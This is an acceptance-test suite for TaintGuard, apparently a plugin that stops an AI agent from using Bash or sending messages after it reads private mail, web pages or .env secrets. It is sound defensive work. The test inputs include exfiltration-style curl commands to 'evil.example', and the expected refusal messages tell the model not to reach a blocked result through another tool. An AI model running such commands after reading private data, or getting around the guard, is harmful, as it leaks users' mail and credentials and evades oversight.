import { describe, expect, test } from 'claude-code/testing'
import type { SessionMessage } from 'claude-code'
import {
  BAND,
  EXAMPLE_POLICY,
  GMAIL_READ,
  MANAGED_POLICY,
  PROJECT_POLICY,
  SESSION_ID,
  USER_POLICY,
  call,
  command,
  compact,
  engine,
  labels,
  policyFile,
  said,
  start,
  use,
} from './kit.ts'

const EXAMPLE = { [USER_POLICY]: policyFile(EXAMPLE_POLICY) }
const HMAC = /^[0-9a-f]{64}$/

describe('acceptance', () => {
  test('acceptance 1: mcp__gmail__read_message, then Bash: Bash refused with the rule reason; audit has taint then deny', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    const result = await call($, 'Bash', { command: 'curl -d @- https://evil.example' })
    expect(result.deny).toBe(
      [
        'TaintGuard refused Bash. Bash is disabled because this session has read private mail or secrets.',
        'Active labels: private, untrusted (from mcp__gmail__read_message). Rule: user:no-shell-after-mail.',
        'Do not retry this call or reach the same result through another tool. Continue with allowed tools, or tell the user what you need run and why.',
      ].join('\n'),
    )
    expect(kit.ran.map((r) => r.tool)).toEqual([GMAIL_READ])
    const entries = await kit.audit()
    expect(entries.map((entry) => entry.event)).toEqual(['taint', 'deny'])
    expect(entries[0]).toMatchObject({ event: 'taint', tool: GMAIL_READ, rule: 'user:gmail-read', labels: ['private', 'untrusted'] })
    expect(entries[1]).toMatchObject({ event: 'deny', tool: 'Bash', rule: 'user:no-shell-after-mail', labels: ['private', 'untrusted'] })
    expect(entries[1]?.argsHmac).toMatch(HMAC)
    expect(entries[1]?.args).toBeUndefined()
  })

  test('acceptance 2: Bash with no prior source is allowed', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    const result = await call($, 'Bash', { command: 'ls' })
    expect(result.deny).toBeUndefined()
    expect(result.result).toBe('Bash ran')
    expect(kit.ran.map((r) => r.tool)).toEqual(['Bash'])
    expect(await labels($)).toEqual([])
  })

  test('acceptance 3: a success source that returns isError adds no taint', async ($, on) => {
    const kit = engine(on, { tools: { WebFetch: { isError: true, result: '404', text: 'Request failed with status code 404' } } })
    await start($, kit)
    const failed = await call($, 'WebFetch', { url: 'https://example.com/missing', prompt: 'read it' })
    expect(failed.isError).toBe(true)
    expect(failed.context).toBeUndefined()
    expect(await labels($)).toEqual([])
    delete kit.tools.WebFetch
    await call($, 'WebFetch', { url: 'https://example.com/', prompt: 'read it' })
    expect(await labels($)).toEqual(['untrusted'])
  })

  test('acceptance 4: an attempt source refused by a permission rule taints anyway', async ($, on) => {
    const kit = engine(on, { tools: { [GMAIL_READ]: { deny: 'Permission to use mcp__gmail__read_message has been denied.' } } })
    await start($, kit)
    const result = await call($, GMAIL_READ, { id: 'm1' })
    expect(result.deny).toBe('Permission to use mcp__gmail__read_message has been denied.')
    expect(await labels($)).toEqual(['private', 'untrusted'])
  })

  test('acceptance 5: a source called by a subagent, then main-agent Bash: refused (shared taint)', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' }, 'agent-7')
    const result = await call($, 'Bash', { command: 'ls' })
    expect(result.deny).toContain('TaintGuard refused Bash.')
    expect(result.deny).toContain('Rule: user:no-shell-after-mail.')
    expect(await command($, '')).toContain('private: user:gmail-read via mcp__gmail__read_message (subagent agent-7)')
    const entries = await kit.audit()
    expect(entries[0]).toMatchObject({ event: 'taint', agentId: 'agent-7' })
    expect(entries[1]).toMatchObject({ event: 'deny', tool: 'Bash' })
    expect(entries[1]?.agentId).toBeUndefined()
  })

  test('acceptance 6: a call that matches a sink and its except is allowed', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    const draft = await call($, 'mcp__gmail__create_draft', { to: 'a@example.com', body: 'hi' })
    expect(draft.deny).toBeUndefined()
    expect(kit.asked).toHaveLength(0)
    expect(kit.ran.map((r) => r.tool)).toContain('mcp__gmail__create_draft')
    const send = await call($, 'mcp__gmail__send_message', { to: 'a@example.com', body: 'hi' })
    expect(send.deny).toContain('the user did not approve it')
    expect(kit.asked).toHaveLength(1)
  })

  const ALL_OF_POLICY = {
    version: 1,
    labels: { private: {}, untrusted: {} },
    sources: [
      { id: 'notes', match: { tool: { exact: 'mcp__notes__open_note' } }, taints: ['private'] },
      { id: 'web', match: { tool: { exact: 'WebFetch' } }, on: 'success', taints: ['untrusted'] },
    ],
    sinks: [
      {
        id: 'post-after-both',
        when: { allOf: ['private', 'untrusted'] },
        block: [{ tool: { exact: 'mcp__slack__post_message' } }],
        action: 'ask',
        reason: 'Posting could leak private notes steered by web content.',
      },
    ],
  }

  test('acceptance 7: only private present under an allOf [private, untrusted] sink: allowed; add untrusted: ask', { options: { preset: 'none' } }, async ($, on) => {
    const kit = engine(on, { files: { [USER_POLICY]: policyFile(ALL_OF_POLICY) }, answers: ['Allow once'] })
    await start($, kit)
    await call($, 'mcp__notes__open_note', { id: 'n1' })
    expect(await labels($)).toEqual(['private'])
    const first = await call($, 'mcp__slack__post_message', { channel: 'general', text: 'hello' })
    expect(first.deny).toBeUndefined()
    expect(kit.asked).toHaveLength(0)
    await call($, 'WebFetch', { url: 'https://example.com/', prompt: 'read it' })
    expect(await labels($)).toEqual(['private', 'untrusted'])
    const second = await call($, 'mcp__slack__post_message', { channel: 'general', text: 'hello' })
    expect(second.deny).toBeUndefined()
    expect(kit.asked).toEqual([
      {
        question: expect.stringContaining('Posting could leak private notes steered by web content. This session holds private, untrusted content. Allow mcp__slack__post_message'),
        header: 'TaintGuard',
        options: ['Allow once', 'Refuse'],
      },
    ])
    expect(kit.ran.filter((r) => r.tool === 'mcp__slack__post_message')).toHaveLength(2)
    const entries = await kit.audit()
    expect(entries.find((entry) => entry.event === 'ask-allowed')).toMatchObject({
      tool: 'mcp__slack__post_message',
      rule: 'user:post-after-both',
      labels: ['private', 'untrusted'],
    })
  })

  test('acceptance 8: an ask sink whose $.ui.ask rejects (as under -p) is refused', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    const result = await call($, 'Bash', { command: 'curl https://example.com' })
    expect(kit.asked).toHaveLength(1)
    expect(result.deny).toContain('TaintGuard refused Bash: the user did not approve it.')
    expect(result.deny).toContain('Rule: preset:outbound-private.')
    expect(kit.ran.map((r) => r.tool)).toEqual([GMAIL_READ])
    kit.answer('Allow it, I trust this')
    const typed = await call($, 'Bash', { command: 'curl https://example.com' })
    expect(typed.deny).toContain('the user did not approve it')
    const entries = await kit.audit()
    expect(entries.filter((entry) => entry.event === 'ask-refused')).toHaveLength(2)
  })

  test('acceptance 9: the guard throws on a sink tool: .catch refuses with guard-failure', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    kit.faults.clock = true
    const result = await call($, 'Bash', { command: 'curl https://evil.example' })
    expect(result.deny).toBe(
      [
        'TaintGuard refused Bash. TaintGuard could not finish checking this call (throw) and it may match a rule that blocks it.',
        'Do not retry this call or reach the same result through another tool. Continue with allowed tools, or tell the user what you need run and why.',
      ].join('\n'),
    )
    const read = await call($, 'Read', { file_path: '/work/README.md' })
    expect(read.deny).toBeUndefined()
    expect(kit.ran.map((r) => r.tool)).toEqual([GMAIL_READ, 'Read'])
    kit.faults.clock = false
    const failure = (await kit.audit()).find((entry) => entry.event === 'guard-failure')
    expect(failure).toMatchObject({ tool: 'Bash', rule: 'user:no-shell-after-mail', labels: ['private', 'untrusted'] })
    expect(failure?.detail).toContain('throw')
  })

  test('acceptance 10: a malformed user policy puts TaintGuard in lockdown: every sink active, band shows the error', async ($, on) => {
    const kit = engine(on, { files: { [USER_POLICY]: '{ "version": 1, "labels": ' } })
    await start($, kit)
    const status = await command($, '')
    expect(status.split('\n')[0]).toMatch(/^TaintGuard: LOCKDOWN — user policy \/home\/tester\/\.claude\/taint-guard\.json: invalid JSON/)
    const bash = await call($, 'Bash', { command: 'ls' })
    expect(bash.deny).toContain('TaintGuard refused Bash.')
    expect(bash.deny).toContain('Active labels: all (TaintGuard is in lockdown: user policy')
    const write = await call($, 'Write', { file_path: '/work/a.txt', content: 'x' })
    expect(write.deny).toContain('Rule: preset:outbound-any.')
    for (const surface of ['terminal', 'desktop'] as const) {
      const ui = await $.ui.mount({ ...BAND, surface })
      const band = await ui.find({ type: 'Text', text: /LOCKDOWN/ })
      expect(band?.text).toMatch(/^TaintGuard · LOCKDOWN: user policy .*invalid JSON.* · all sinks active$/)
      expect(band?.props.color).toBe('red')
      await ui.unmount()
    }
    expect((await kit.audit()).map((entry) => entry.event)).toContain('lockdown')
  })

  test('acceptance 10: a throwing $.settings.read({ source: "policy" }) puts TaintGuard in lockdown', { options: { enabled: false } }, async ($, on) => {
    const kit = engine(on, { managed: new Error('policy settings unreadable') })
    await start($, kit)
    expect((await command($, '')).split('\n')[0]).toMatch(/^TaintGuard: LOCKDOWN — cannot read managed settings: .*policy settings unreadable$/)
    expect((await call($, 'Bash', { command: 'ls' })).deny).toContain('TaintGuard refused Bash.')
    const ui = await $.ui.mount({ ...BAND, surface: 'terminal' })
    expect((await ui.find({ type: 'Text', text: /LOCKDOWN/ }))?.text).toMatch(
      /^TaintGuard · LOCKDOWN: cannot read managed settings: .*policy settings unreadable · all sinks active$/,
    )
    await ui.unmount()
  })

  const MANAGED_RULES = {
    version: 1,
    labels: { secret: { description: 'Credentials' } },
    sources: [
      {
        id: 'env-read',
        match: { tool: { exact: 'Read' }, arguments: [{ pointer: '/file_path', matches: '\\.env$' }] },
        taints: ['secret'],
      },
    ],
    sinks: [
      {
        id: 'no-bash-after-secret',
        when: { anyOf: ['secret'] },
        block: [{ tool: { exact: 'Bash' } }],
        reason: 'Your organization blocks Bash after secrets are read.',
      },
    ],
  }
  const PROJECT_WEAKENER = {
    version: 1,
    labels: { repo: {} },
    sinks: [{ id: 'managed:no-bash-after-secret', enabled: false }],
  }
  const USER_SET_MANAGED = {
    version: 1,
    labels: { everything: {} },
    sinks: [{ id: 'refuse-read', when: {}, block: [{ tool: { exact: 'Read' } }], reason: 'Never loaded.' }],
  }

  test('acceptance 11: a project policy cannot disable a managed rule; a user-set managedPolicyPath is ignored with a warning', {
    options: { managedPolicyPath: '/tmp/user-chosen.json', preset: 'none' },
  }, async ($, on) => {
    const kit = engine(on, {
      managed: { pluginConfigs: { 'taint-guard@dortort': { options: { managedPolicyPath: MANAGED_POLICY } } } },
      files: {
        [MANAGED_POLICY]: policyFile(MANAGED_RULES),
        [PROJECT_POLICY]: policyFile(PROJECT_WEAKENER),
        '/tmp/user-chosen.json': policyFile(USER_SET_MANAGED),
      },
    })
    await start($, kit)
    expect(kit.logs).toContain('TaintGuard: managedPolicyPath in user settings is ignored; only managed settings can set it')
    expect(kit.logs).toContain('TaintGuard: project policy cannot disable managed:no-bash-after-secret; the rule stays on')
    const read = await call($, 'Read', { file_path: '/work/.env' })
    expect(read.deny).toBeUndefined()
    const bash = await call($, 'Bash', { command: 'env' })
    expect(bash.deny).toContain('Your organization blocks Bash after secrets are read.')
    expect(bash.deny).toContain('Rule: managed:no-bash-after-secret.')
    const status = await command($, '')
    expect(status).toContain(`managed: loaded, 2 rules, ${MANAGED_POLICY}`)
    expect(status).toContain('managedPolicyPath in user settings is ignored')
  })

  test('acceptance 12: classic.SessionStart clear empties the taint set; session.compact leaves it intact', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    const compacted = await compact($, kit)
    expect(compacted.skip).toBeUndefined()
    expect(await labels($)).toEqual(['private', 'untrusted'])
    await $.session.end({ reason: 'clear', sessionId: SESSION_ID, resume: { id: SESSION_ID } })
    await $.classic.SessionStart({ source: 'clear', session_id: 'sess-2' })
    expect(await labels($)).toEqual([])
    const clean = await compact($, kit)
    expect(kit.compacted).toHaveLength(2)
    expect(kit.compacted[1]?.instructions).toBeUndefined()
    expect(clean.messages?.map((m) => m.text)).toEqual(['Summary of the conversation so far.'])
    expect(await labels($)).toEqual([])
    const reset = (await kit.audit('sess-2')).find((entry) => entry.event === 'reset')
    expect(reset).toMatchObject({ labels: ['private', 'untrusted'] })
  })

  test('acceptance 13: a reload mid-session keeps the labels from $.state and rebuilds nothing', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    kit.setMessages([use('Read', { file_path: '/work/.env' })])
    await start($, kit)
    expect(await labels($)).toEqual(['private', 'untrusted'])
    expect((await kit.audit()).map((entry) => entry.event)).not.toContain('rebuild')
  })

  test('acceptance 14: classic.SessionStart resume rebuilds labels from history; a full history assumes every label', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    expect(await labels($)).toEqual([])
    kit.setMessages([said('user', 'check my mail'), use(GMAIL_READ, { id: 'm1' }, { id: 'toolu_mail' })])
    await $.classic.SessionStart({ source: 'resume', session_id: 'sess-old' })
    expect(await labels($)).toEqual(['private', 'untrusted'])
    const rebuilt = (await kit.audit('sess-old')).find((entry) => entry.event === 'rebuild')
    expect(rebuilt).toMatchObject({ labels: ['private', 'untrusted'], detail: 'rebuilt after resume' })

    const full: SessionMessage[] = Array.from({ length: 4096 }, (_, i) => said(i % 2 === 0 ? 'user' : 'assistant', `turn ${i}`))
    kit.setMessages(full)
    await $.classic.SessionStart({ source: 'resume', session_id: 'sess-long' })
    expect(await labels($)).toEqual(['private', 'secret', 'untrusted'])
    const cut = (await kit.audit('sess-long')).find((entry) => entry.event === 'rebuild')
    expect(cut?.detail).toContain('history may be cut')
  })

  test('acceptance 15: /taintguard clear with userDeclassify never is refused and leaves the labels', async ($, on) => {
    const kit = engine(on, { files: { [USER_POLICY]: policyFile({ ...EXAMPLE_POLICY, userDeclassify: 'never' }) }, answers: ['Clear'] })
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    expect(await command($, 'clear')).toBe('Declassification is disabled by the user policy (userDeclassify: never).')
    expect(kit.asked).toHaveLength(0)
    expect(await labels($)).toEqual(['private', 'untrusted'])
    expect((await kit.audit()).map((entry) => entry.event)).not.toContain('declassify')
  })

  const SEND_POLICY = {
    version: 1,
    labels: { private: {} },
    sources: [{ id: 'sent-mail', match: { tool: { exact: 'mcp__mailer__send_email' } }, taints: ['private'] }],
    sinks: [
      {
        id: 'no-send-after-private',
        when: { anyOf: ['private'] },
        block: [{ tool: { exact: 'mcp__mailer__send_email' } }],
        reason: 'Sending is refused once private content is present.',
      },
    ],
  }

  test('acceptance 16: a call that is both source and sink is judged on earlier taint only', { options: { preset: 'none' } }, async ($, on) => {
    const kit = engine(on, { files: { [USER_POLICY]: policyFile(SEND_POLICY) } })
    await start($, kit)
    const first = await call($, 'mcp__mailer__send_email', { to: 'a@example.com' })
    expect(first.deny).toBeUndefined()
    expect(await labels($)).toEqual(['private'])
    const second = await call($, 'mcp__mailer__send_email', { to: 'a@example.com' })
    expect(second.deny).toContain('Rule: user:no-send-after-private.')
    expect(kit.ran.filter((r) => r.tool === 'mcp__mailer__send_email')).toHaveLength(1)
  })

  test('acceptance 16: the trifecta preset judges apply_label (source and sink) on earlier taint', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    const first = await call($, 'mcp__gmail__apply_label', { id: 'm1', label: 'done' })
    expect(first.deny).toBeUndefined()
    expect(kit.asked).toHaveLength(0)
    const second = await call($, 'mcp__gmail__apply_label', { id: 'm2', label: 'done' })
    expect(kit.asked).toHaveLength(1)
    expect(second.deny).toContain('Rule: preset:outbound-private.')
  })

  test('acceptance 17: a source result carries one context line naming the new labels and refused tools; none when taint did not grow', async ($, on) => {
    const kit = engine(on, { files: EXAMPLE })
    await start($, kit)
    const first = await call($, GMAIL_READ, { id: 'm1' })
    expect(first.context).toHaveLength(1)
    const line = first.context?.[0] ?? ''
    expect(line).toMatch(
      /^TaintGuard: this session now holds private, untrusted content \(from mcp__gmail__read_message\)\. From now on these tools will be refused: Bash\. These need user approval: .*WebFetch/,
    )
    const again = await call($, GMAIL_READ, { id: 'm2' })
    expect(again.context).toBeUndefined()
    const plain = await call($, 'Read', { file_path: '/work/README.md' })
    expect(plain.context).toBeUndefined()
    expect(kit.ran).toHaveLength(3)
  })

  test('acceptance 18: the trifecta preset classifies two mail reads as sources and a Slack send as a sink', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    const search = await command($, 'explain mcp__claude_ai_Gmail__gmail_search_messages {"query":"invoice"}')
    expect(search).toContain('Would be allowed')
    expect(search).toContain('preset:private-read (on attempt): private, untrusted')
    const list = await command($, 'explain mcp__mail__list_messages')
    expect(list).toContain('preset:private-read (on attempt): private, untrusted')
    const sendClean = await command($, 'explain mcp__slack__slack_send_message {"channel":"C1","text":"hi"}')
    expect(sendClean).toContain('Sources that would fire: none')
    await call($, 'mcp__claude_ai_Gmail__gmail_search_messages', { query: 'invoice' })
    expect(await labels($)).toEqual(['private', 'untrusted'])
    const sendTainted = await command($, 'explain mcp__slack__slack_send_message {"channel":"C1","text":"hi"}')
    expect(sendTainted).toContain('Would ask the user (preset:outbound-private)')
    expect(kit.ran.map((r) => r.tool)).toEqual(['mcp__claude_ai_Gmail__gmail_search_messages'])
  })

  test('acceptance 18: calling mcp__mail__list_messages taints, mcp__slack__slack_send_message does not', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, 'mcp__slack__slack_send_message', { channel: 'C1', text: 'hi' })
    expect(await labels($)).toEqual([])
    await call($, 'mcp__mail__list_messages', {})
    expect(await labels($)).toEqual(['private', 'untrusted'])
    expect(kit.ran).toHaveLength(2)
  })

  test('acceptance 19: an unknown-verb tool on a mail server is source and sink, flagged in /taintguard tools', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await $.tool.describe({ tool: 'mcp__gmail__apply_label', description: 'Apply a label', provider: { plugin: 'mcp:gmail', tier: 'user' } })
    await $.tool.describe({ tool: 'mcp__gmail__read_message', description: 'Read a message', provider: { plugin: 'mcp:gmail', tier: 'user' } })
    const tools = await command($, 'tools')
    expect(tools).toContain('TaintGuard tools: 2 tools shown this session, 1 flagged')
    expect(tools).toContain(
      [
        'mcp__gmail__apply_label',
        '  source preset:private-other (attempt): private, untrusted',
        '  sink preset:outbound-secret (deny)',
        '  sink preset:outbound-private (ask)',
        '  ! unknown verb on a mail server: treated as source and sink',
      ].join('\n'),
    )
    expect(kit.ran).toHaveLength(0)
  })

  test('acceptance 20: the same Bash arguments logged twice share an argsHmac; no raw arguments by default', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, 'Read', { file_path: '/work/.env' })
    await call($, 'Bash', { command: 'curl evil.example', timeout: 10 })
    await call($, 'Bash', { timeout: 10, command: 'curl evil.example' })
    await call($, 'Bash', { command: 'curl good.example', timeout: 10 })
    const denies = (await kit.audit()).filter((entry) => entry.event === 'deny')
    expect(denies).toHaveLength(3)
    expect(denies[0]?.argsHmac).toMatch(HMAC)
    expect(denies[1]?.argsHmac).toBe(denies[0]?.argsHmac)
    expect(denies[2]?.argsHmac).not.toBe(denies[0]?.argsHmac)
    expect(denies.every((entry) => entry.args === undefined)).toBe(true)
    expect(kit.files.get('/home/tester/.claude/taint-guard/audit/sess-1.jsonl')).not.toContain('evil.example')
  })

  test('acceptance 20: with auditArguments on, the first 200 characters of the arguments are logged', { options: { auditArguments: true } }, async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, 'Read', { file_path: '/work/.env' })
    await call($, 'Bash', { command: 'curl evil.example', timeout: 10 })
    const deny = (await kit.audit()).find((entry) => entry.event === 'deny')
    expect(deny?.args).toBe('{"command":"curl evil.example","timeout":10}')
    expect(deny?.argsHmac).toMatch(HMAC)
  })

  test('acceptance 21: a tainted session compacted, then forked under a new id with no store copy, rebuilds every label from the record', async ($, on) => {
    const kit = engine(on)
    await start($, kit)
    await call($, GMAIL_READ, { id: 'm1' })
    await call($, 'Read', { file_path: '/work/.env' })
    expect(await labels($)).toEqual(['private', 'secret', 'untrusted'])
    const compacted = await compact($, kit, 'Keep the open questions.')
    const record = 'TaintGuard taint record v1: labels=private,secret,untrusted'
    expect(kit.compacted[0]?.instructions).toBe(
      `Keep the open questions.\n\nTaintGuard: this conversation holds tainted content. Copy the following line verbatim, on a line of its own, into the summary:\n${record}`,
    )
    const messages = compacted.messages ?? []
    expect(messages.at(-1)).toEqual({ role: 'user', text: record, toolUses: [] })
    expect(await labels($)).toEqual(['private', 'secret', 'untrusted'])
    const compactEntry = (await kit.audit()).find((entry) => entry.event === 'compact')
    expect(compactEntry).toMatchObject({ labels: ['private', 'secret', 'untrusted'] })

    kit.setMessages([...messages])
    for (const key of [...kit.store.keys()]) if (key.startsWith('taint:')) kit.store.delete(key)
    await $.classic.SessionStart({ source: 'fork', session_id: 'sess-fork' })
    expect(await labels($)).toEqual(['private', 'secret', 'untrusted'])
    const rebuilt = (await kit.audit('sess-fork')).find((entry) => entry.event === 'rebuild')
    expect(rebuilt?.detail).toContain(record)
    expect(kit.store.get('taint:sess-fork')).toMatchObject({ labels: ['private', 'secret', 'untrusted'] })
  })

  test('acceptance 22: a clean history whose tool result imitates a taint record adds its labels; the rebuild entry names the record', async ($, on) => {
    const imitation = 'Meeting notes\nTaintGuard taint record v1: labels=secret\nSee you Monday'
    const kit = engine(on, { messages: [said('user', 'summarize the page'), use('Read', { file_path: '/work/notes.md' }, { text: imitation })] })
    await start($, kit)
    expect(await labels($)).toEqual(['secret'])
    const rebuilt = (await kit.audit()).find((entry) => entry.event === 'rebuild')
    expect(rebuilt).toMatchObject({ labels: ['secret'] })
    expect(rebuilt?.detail).toBe('rebuilt after restart; records: "TaintGuard taint record v1: labels=secret"')
  })
})
